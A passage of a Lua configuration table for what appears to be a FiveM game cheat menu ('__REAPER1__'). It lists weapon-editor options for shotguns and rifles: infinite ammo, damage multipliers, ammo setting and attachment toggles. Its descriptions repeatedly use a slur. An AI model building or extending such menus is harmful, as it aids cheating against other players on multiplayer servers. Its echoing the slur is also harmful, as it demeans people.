            {text = 'Suppressor', dkey = 'weapon:pumpshotgun_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SR_SUPP`},
            {text = 'Luxury variant', dkey = 'weapon:pumpshotgun_luxuryvariant', desc = 'Enable the luxury variant.', afu = __REAPER1__.M.weapon.editor.luxuryvariant, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_VARMOD_LOWRIDER`},
        },
        
        ['weapon:sawnoffshotgun'] = {
            {text = 'Set ammo', dkey = 'weapon:sawnoffshotgun_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:sawnoffshotgun_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:sawnoffshotgun_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:sawnoffshotgun_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:sawnoffshotgun_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Gun metal finish', dkey = 'weapon:sawnoffshotgun_gunmetalfinish', desc = 'Enable the gun metal finish.', afu = __REAPER1__.M.weapon.editor.luxuryvariant, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SAWNOFFSHOTGUN_VARMOD_LUXE`},
        },
        
        ['weapon:assaultshotgun'] = {
            {text = 'Set ammo', dkey = 'weapon:assaultshotgun_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:assaultshotgun_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:assaultshotgun_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:assaultshotgun_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:assaultshotgun_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:assaultshotgun_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTSHOTGUN_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:assaultshotgun_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTSHOTGUN_CLIP_02`},
            {text = 'Flashlight', dkey = 'weapon:assaultshotgun_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Suppressor', dkey = 'weapon:assaultshotgun_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP`},
            {text = 'Grip', dkey = 'weapon:assaultshotgun_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP`},
        },
        
        ['weapon:bullpupshotgun'] = {
            {text = 'Set ammo', dkey = 'weapon:bullpupshotgun_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:bullpupshotgun_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:bullpupshotgun_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:bullpupshotgun_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:bullpupshotgun_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Flashlight', dkey = 'weapon:bullpupshotgun_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Suppressor', dkey = 'weapon:bullpupshotgun_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP_02`},
            {text = 'Grip', dkey = 'weapon:bullpupshotgun_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP`},
        },
        
        ['weapon:pumpshotgun_mk2'] = {
            {text = 'Set ammo', dkey = 'weapon:pumpshotgun_mk2_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:pumpshotgun_mk2_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:pumpshotgun_mk2_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:pumpshotgun_mk2_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:pumpshotgun_mk2_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Default shells', dkey = 'weapon:pumpshotgun_mk2_defaultshells', desc = 'Enable the default shells.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, category = 'WEAPON_PUMPSHOTGUN_MK2MG_MK2', extra = `COMPONENT_PUMPSHOTGUN_MK2_CLIP_01`},
            {text = 'Dragon\'s breath shells', dkey = 'weapon:pumpshotgun_mk2_dragonsbreathshells', desc = 'Enable the dragon\'s breath shells.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY`},
            {text = 'Steel buckshot shells', dkey = 'weapon:pumpshotgun_mk2_steelbuckshotshells', desc = 'Enable the steel buckshot shells.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING`},
            {text = 'Flechette shells', dkey = 'weapon:pumpshotgun_mk2_flechetteshells', desc = 'Enable the flechette shells.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT`},
            {text = 'Explosive slugs', dkey = 'weapon:pumpshotgun_mk2_explosiveslugs', desc = 'Enable the esplosive slugs.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE`},
            {text = 'Holographic sight', dkey = 'weapon:pumpshotgun_mk2_holographicsight', desc = 'Enable the holographic sight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SIGHTS`},
            {text = 'Small scope', dkey = 'weapon:pumpshotgun_mk2_smallscope', desc = 'Enable the small scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MACRO_MK2`},
            {text = 'Medium scope', dkey = 'weapon:pumpshotgun_mk2_mediumscope', desc = 'Enable the medium scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_SMALL_MK2`},
            {text = 'Flashlight', dkey = 'weapon:pumpshotgun_mk2_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Suppressor', dkey = 'weapon:pumpshotgun_mk2_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SR_SUPP_03`},
            {text = 'Squared muzzle break', dkey = 'weapon:pumpshotgun_mk2_squaredmuzzlebreak', desc = 'Enable the squared muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_08`},
            {text = 'Digital camo', dkey = 'weapon:pumpshotgun_mk2_digitalcamo', desc = 'Enable the digital camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CAMO`},
            {text = 'Bruhstroke camo', dkey = 'weapon:pumpshotgun_mk2_bruhstrokecamo', desc = 'Enable the bruhstroke camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CAMO_02`},
            {text = 'Woodland camo', dkey = 'weapon:pumpshotgun_mk2_woodlandcamo', desc = 'Enable the woodland camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CAMO_03`},
            {text = 'Skull camo', dkey = 'weapon:pumpshotgun_mk2_skullcamo', desc = 'Enable the skull camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CAMO_04`},
            {text = 'Sessanta nove camo', dkey = 'weapon:pumpshotgun_mk2_sessantanovecamo', desc = 'Enable the sessanta nove camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CAMO_05`},
            {text = 'Perseus camo', dkey = 'weapon:pumpshotgun_mk2_perseuscamo', desc = 'Enable the perseus camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CAMO_06`},
            {text = 'Leopard camo', dkey = 'weapon:pumpshotgun_mk2_leopardcamo', desc = 'Enable the leopard camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CAMO_07`},
            {text = 'Zebra camo', dkey = 'weapon:pumpshotgun_mk2_zebracamo', desc = 'Enable the zebra camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CAMO_08`},
            {text = 'Geometric camo', dkey = 'weapon:pumpshotgun_mk2_geometriccamo', desc = 'Enable the geometric camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CAMO_09`},
            {text = 'Boom camo', dkey = 'weapon:pumpshotgun_mk2_boomcamo', desc = 'Enable the boom camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CAMO_10`},
            {text = 'Patriotic camo', dkey = 'weapon:pumpshotgun_mk2_patrioticcamo', desc = 'Enable the patriotic camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PUMPSHOTGUN_MK2_CAMO_IND_01`},
        },
        
        ['weapon:heavyshotgun'] = {
            {text = 'Set ammo', dkey = 'weapon:heavyshotgun_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:heavyshotgun_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:heavyshotgun_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:heavyshotgun_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:heavyshotgun_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:heavyshotgun_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSHOTGUN_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:heavyshotgun_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSHOTGUN_CLIP_02`},
            {text = 'Drum clip', dkey = 'weapon:heavyshotgun_drumclip', desc = 'Enable the drum clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYSHOTGUN_CLIP_03`},
            {text = 'Flashlight', dkey = 'weapon:heavyshotgun_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Suppressor', dkey = 'weapon:heavyshotgun_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP_02`},
            {text = 'Grip', dkey = 'weapon:heavyshotgun_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP`},
        },
        
        ['weapon:assaultrifle'] = {
            {text = 'Set ammo', comp = 'WEAPON_ASSAULTRIFLE', dkey = 'weapon:assaultrifle_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', comp = 'WEAPON_ASSAULTRIFLE', dkey = 'weapon:assaultrifle_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', comp = 'WEAPON_ASSAULTRIFLE', dkey = 'weapon:assaultrifle_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', comp = 'WEAPON_ASSAULTRIFLE', dkey = 'weapon:assaultrifle_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', comp = 'WEAPON_ASSAULTRIFLE', dkey = 'weapon:assaultrifle_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:assaultrifle_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, category = 'WEAPON_ASSAULTRIFLE', extra = `COMPONENT_ASSAULTRIFLE_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:assaultrifle_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, category = 'WEAPON_ASSAULTRIFLE', extra = `COMPONENT_ASSAULTRIFLE_CLIP_02`},
            {text = 'Drum clip', dkey = 'weapon:assaultrifle_drumclip', desc = 'Enable the drum clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, category = 'WEAPON_ASSAULTRIFLE', extra = `COMPONENT_ASSAULTRIFLE_CLIP_03`},
            {text = 'Flashlight', dkey = 'weapon:assaultrifle_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, category = 'WEAPON_ASSAULTRIFLE', extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Scope', dkey = 'weapon:assaultrifle_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, category = 'WEAPON_ASSAULTRIFLE', extra = `COMPONENT_AT_SCOPE_MACRO`},
            {text = 'Suppressor', dkey = 'weapon:assaultrifle_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, category = 'WEAPON_ASSAULTRIFLE', extra = `COMPONENT_AT_AR_SUPP_02`},
            {text = 'Grip', dkey = 'weapon:assaultrifle_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, category = 'WEAPON_ASSAULTRIFLE', extra = `COMPONENT_AT_AR_AFGRIP`},
            {text = 'Luxury variant', dkey = 'weapon:assaultrifle_luxuryvariant', desc = 'Enable the luxury variant.', afu = __REAPER1__.M.weapon.editor.luxuryvariant, option = __REAPER1__.M.Checkbox, func = false, category = 'WEAPON_ASSAULTRIFLE', extra = `COMPONENT_ASSAULTRIFLE_VARMOD_LUXE`},
        },
        
        ['weapon:carbinerifle'] = {
            {text = 'Set ammo', dkey = 'weapon:carbinerifle_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:carbinerifle_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:carbinerifle_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:carbinerifle_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:carbinerifle_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:carbinerifle_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:carbinerifle_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_CLIP_02`},
            {text = 'Box clip', dkey = 'weapon:carbinerifle_boxclip', desc = 'Enable the box clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_CLIP_03`},
            {text = 'Flashlight', dkey = 'weapon:carbinerifle_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Scope', dkey = 'weapon:carbinerifle_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MEDIUM`},
            {text = 'Suppressor', dkey = 'weapon:carbinerifle_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP`},
            {text = 'Grip', dkey = 'weapon:carbinerifle_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP`},
            {text = 'Luxury variant', dkey = 'weapon:carbinerifle_luxuryvariant', desc = 'Enable the luxury variant.', afu = __REAPER1__.M.weapon.editor.luxuryvariant, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_VARMOD_LUXE`},
        },
        
        ['weapon:advancedrifle'] = {
            {text = 'Set ammo', dkey = 'weapon:advancedrifle_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:advancedrifle_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:advancedrifle_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:advancedrifle_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:advancedrifle_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:advancedrifle_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ADVANCEDRIFLE_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:advancedrifle_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ADVANCEDRIFLE_CLIP_02`},
            {text = 'Flashlight', dkey = 'weapon:advancedrifle_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Scope', dkey = 'weapon:advancedrifle_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_SMALL`},
            {text = 'Suppressor', dkey = 'weapon:advancedrifle_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP`},
            {text = 'Gun metal finish', dkey = 'weapon:advancedrifle_gunmetalfinish', desc = 'Enable the gun metal finish.', afu = __REAPER1__.M.weapon.editor.luxuryvariant, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ADVANCEDRIFLE_VARMOD_LUXE`},
        },
        
        ['weapon:specialcarbine'] = {
            {text = 'Set ammo', dkey = 'weapon:specialcarbine_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:specialcarbine_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
